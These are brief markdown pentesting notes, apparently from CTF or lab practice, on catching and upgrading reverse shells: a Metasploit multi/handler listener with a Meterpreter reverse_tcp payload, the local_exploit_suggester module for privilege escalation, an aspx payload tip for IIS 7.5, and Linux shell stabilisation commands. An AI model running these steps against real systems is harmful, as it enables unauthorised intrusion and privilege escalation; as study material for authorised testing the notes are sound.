# SHELL, reverse, bind

## msfconsole

- listener

  - `use exploit/multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
    - the same one used to generate the payload with msfvenom

- privesc
  - Running `sysinfo` in the Meterpreter session reveals that the target is x86 architecture, so it is
    possible to get fairly reliable suggestions with the local_exploit_suggester module. The same can
    not be said for running the module on x64
  - `use post/multi/recon/local_exploit_suggester`
    - find potential vectors for privesc, msf modules

## payloads

- for `Microsoft IIS httpd 7.5` use aspx file

## Linux shell stabilization

- `python2 -c 'import pty;pty.spawn("/bin/bash")'`
- ctrl + z to background
- `stty raw -echo`, to fix tab completition
- `fg`, to bring back the shell

- [optional, fix vim]
  - on attacker
    - `echo $TERM`
      > xterm-256color
  - on victim rev shell
    - `export TERM=screen`
    - or `export TERM=xterm-256color` ?
